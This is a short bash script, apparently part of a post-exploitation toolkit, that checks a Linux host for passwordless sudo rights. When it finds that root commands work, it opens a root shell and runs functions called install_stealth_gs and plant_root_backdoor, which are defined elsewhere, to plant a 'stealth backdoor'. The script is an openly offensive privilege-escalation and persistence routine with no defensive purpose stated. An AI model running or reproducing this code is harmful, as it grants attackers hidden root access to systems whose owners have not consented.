#!/bin/bash
source "$(dirname "$0")/00_common.sh"

info "Checking sudo misconfigurations..."

# Check sudo -l
if sudo -n -l 2>/dev/null | grep -qE 'NOPASSWD|ALL'; then
    success "VULNERABLE: sudo NOPASSWD found!"
    echo ""
    sudo -n -l 2>/dev/null
    echo ""
    
    # Check if we can get root shell
    if sudo -n id 2>/dev/null | grep -q "uid=0"; then
        success "Can execute as root!"
        # Plant stealth backdoor
        sudo -n /bin/sh --norc --noprofile -c "$(declare -f install_stealth_gs plant_root_backdoor); plant_root_backdoor"
    fi
else
    fail "No sudo NOPASSWD found"
fi
